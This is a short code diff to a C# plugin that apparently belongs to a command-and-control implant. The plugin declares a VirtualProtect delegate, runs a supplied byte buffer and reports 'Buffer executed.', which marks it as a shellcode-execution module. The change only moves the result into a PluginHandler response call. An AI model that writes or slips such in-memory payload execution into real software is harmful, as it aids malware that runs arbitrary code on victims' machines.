@@ -28,7 +28,7 @@ namespace Plugin
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-        public static ResponseResult Execute(Dictionary<string, object> args)
+        public static void Execute(Dictionary<string, object> args)
         {
             byte[] buffer;
             if (args.ContainsKey("buffer"))
@@ -54,15 +54,13 @@ namespace Plugin
                 }
             });
 
-            return new ResponseResult()
+            PluginHandler.AddResponse(new ResponseResult()
             {
                 completed = "true",
                 user_output = "Buffer executed.",
                 task_id = (string)args["task-id"],
                 status = "success"
-            };
-
-
+            });
         }
     }
 }
